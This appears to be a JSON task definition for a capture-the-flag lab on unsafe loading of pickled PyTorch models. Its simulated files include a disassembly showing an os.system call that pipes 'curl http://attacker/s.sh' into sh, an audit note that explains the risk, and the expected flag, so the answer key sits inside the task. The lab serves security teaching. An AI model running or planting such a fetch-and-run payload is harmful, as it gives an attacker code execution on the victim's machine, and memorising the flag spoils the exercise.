@@ -1,0 +1,31 @@
+{
+  "id": "cloud-ai-supply-chain",
+  "workdir": "/home/student/aisc",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/aisc/found.txt",
+    "contains": "nto{p1ckl3_m0d3l_rce_0n_l04d}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/aisc",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/aisc/task.md",
+      "text": "# Задача\n\nПайплайн загружает модель из внешнего источника. Определи риск и собери флаг.\n\nЗапиши флаг в found.txt как `nto{...}`.\n"
+    },
+    {
+      "path": "/home/student/aisc/model-load.py",
+      "text": "import torch\nmodel = torch.load(\"downloaded-model.bin\")\n"
+    },
+    {
+      "path": "/home/student/aisc/pickle-disasm.txt",
+      "text": "pickletools dis downloaded-model.bin:\n  0: GLOBAL os.system\n  ...\n  REDUCE  -> os.system(\"curl http://attacker/s.sh | sh\")\n"
+    },
+    {
+      "path": "/home/student/aisc/notes.md",
+      "text": "Аудит: torch.load без weights_only загружает pickle.\nВ файле — GLOBAL os.system, значит, при загрузке исполнится код (RCE).\nnto{p1ckl3_m0d3l_rce_0n_l04d}\n"
+    }
+  ]
+}
